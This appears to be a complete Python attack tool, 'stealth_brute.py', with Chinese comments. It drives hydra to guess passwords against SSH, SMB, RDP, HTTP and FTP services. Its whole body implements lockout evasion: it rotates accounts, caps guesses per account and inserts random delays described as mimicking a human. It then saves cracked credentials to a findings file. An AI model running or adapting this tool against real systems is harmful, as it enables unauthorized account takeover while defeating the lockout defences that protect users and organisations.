#!/usr/bin/env python3
"""stealth_brute.py — 防锁爆破执行器（爆破类升级 C2）。

相对原生 hydra/kerbrute 的升级:
  - 多账号轮换: 不连续打同一账号，避免触发锁定策略（Kerberos 5 次/30min）
  - 随机间隔: 1-3s 随机，模拟人工
  - 每账号限次: 默认每账号最多 2 次尝试
  - 支持社工字典（soceng_dict.py 输出）

用法:
    py stealth_brute.py --target ssh://192.168.1.1 -U users.txt -P /tmp/soceng.txt
    py stealth_brute.py --target smb://dc.corp.local -U users.txt -P dict.txt
"""

from __future__ import annotations

import argparse
import random
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

# 防锁策略默认值
MAX_ATTEMPTS_PER_USER = 2      # 每账号最多尝试次数
MIN_DELAY = 1.0                # 最小间隔秒
MAX_DELAY = 3.0                # 最大间隔秒
USER_ROTATION = True           # 多账号轮换


def load_lines(path: str) -> List[str]:
    return [l.strip() for l in open(path, encoding="utf-8", errors="replace") if l.strip()]


def build_cmd(target: str, service: str, users: List[str], passwords: List[str],
              extra: str = "") -> List[str]:
    """构建 hydra 命令（stealth 参数）。"""
    cmd = ["hydra", "-L", "-", "-P", "-", "-f", "-t", "4"]  # -f 找到即停, -t 4 低并发
    if service == "ssh":
        cmd += ["ssh://" + target]
    elif service == "smb":
        cmd += ["smb://" + target]
    elif service == "rdp":
        cmd += ["rdp://" + target]
    elif service == "http":
        cmd += ["http-get://" + target]
    elif service == "ftp":
        cmd += ["ftp://" + target]
    else:
        cmd += [service + "://" + target]
    if extra:
        cmd += extra.split()
    return cmd


def run_stealth(target: str, service: str, user_file: str, pass_file: str,
                max_per_user: int = MAX_ATTEMPTS_PER_USER,
                extra: str = "") -> Dict[str, any]:
    """stealth 爆破：多账号轮换 + 随机间隔 + 每账号限次。"""
    users = load_lines(user_file)
    passwords = load_lines(pass_file)
    if not users or not passwords:
        return {"success": False, "error": "users/passwords empty", "hits": []}

    hits = []
    # 账号轮换：每个账号只试 max_per_user 个密码，轮换下个账号
    user_idx = 0
    attempts = 0
    while user_idx < len(users):
        user = users[user_idx]
        # 该账号试 max_per_user 个密码（轮换取，不连续同账号）
        for k in range(max_per_user):
            pwd_idx = (user_idx * max_per_user + k) % len(passwords)
            password = passwords[pwd_idx]
            attempts += 1

            # 随机间隔（防锁）
            time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

            # 调 hydra 单账号单密码
            cmd = ["hydra", "-l", user, "-p", password, "-f", "-t", "1",
                   f"{service}://{target}"] + (extra.split() if extra else [])
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                out = (r.stdout or "") + (r.stderr or "")
                if "[SUCCESS]" in out or "login:" in out.lower() and "success" in out.lower():
                    hits.append({"user": user, "password": password, "service": service, "target": target})
                    print(f"  [+] 命中: {user}:{password}")
                    break  # 该账号命中停止
            except Exception:
                pass

        user_idx += 1
        if attempts > len(users) * max_per_user:
            break

    # C3: 命中写结果文件（MCP 侧 ingest 入库）
    if hits:
        import json as _json
        try:
            out = {"findings": [{
                "task_id": "stealth_brute",
                "title": f"凭据命中 {h['service']}://{h['target']}",
                "target": f"{h['service']}://{h['target']}",
                "severity": "critical",
                "reproduce_cmd": f"hydra -l {h['user']} -p {h['password']} {h['service']}://{h['target']}",
                "expected_signal": "login success",
                "source": "stealth_brute",
                "meta": {"user": h["user"], "password": h["password"], "service": h["service"]},
            } for h in hits]}
            f = Path("/tmp/stealth_brute_findings.json")
            f.write_text(_json.dumps(out, ensure_ascii=False, indent=2))
        except Exception:
            pass
    return {"success": bool(hits), "hits": hits, "attempts": attempts}


def main():
    ap = argparse.ArgumentParser(description="stealth 爆破（防锁）")
    ap.add_argument("--target", required=True, help="target host")
    ap.add_argument("--service", default="ssh", help="ssh/smb/rdp/http/ftp")
    ap.add_argument("-U", "--users", required=True, help="user list file")
    ap.add_argument("-P", "--passwords", required=True, help="password list file")
    ap.add_argument("--max-per-user", type=int, default=MAX_ATTEMPTS_PER_USER)
    ap.add_argument("--extra", default="", help="extra hydra args")
    args = ap.parse_args()

    print(f"[stealth-brute] {args.service}://{args.target} 用户{args.max_per_user}次/账号")
    r = run_stealth(args.target, args.service, args.users, args.passwords,
                    args.max_per_user, args.extra)
    print(f"[stealth-brute] 尝试 {r['attempts']} 次, 命中 {len(r.get('hits', []))}")
    for h in r.get("hits", []):
        print(f"  [+] {h['user']}:{h['password']}")


if __name__ == "__main__":
    main()
